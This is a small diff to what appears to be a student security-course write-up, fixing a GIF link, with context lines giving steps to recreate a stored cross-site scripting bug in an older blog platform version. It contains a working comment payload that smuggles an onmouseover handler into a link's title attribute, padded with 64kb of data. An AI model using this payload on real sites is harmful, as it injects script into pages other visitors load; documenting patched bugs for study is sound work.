@@ -12,7 +12,7 @@ Time spent: **5** hours spent in total
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough:
-        ![]Week7_Attack1.gif)
+        ![ ](Week7_Attack1.gif)
   - [ ] Steps to recreate:
         1. Paste the following as a comment on a post:
         	<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  <insert 64kb of random data>'></a>
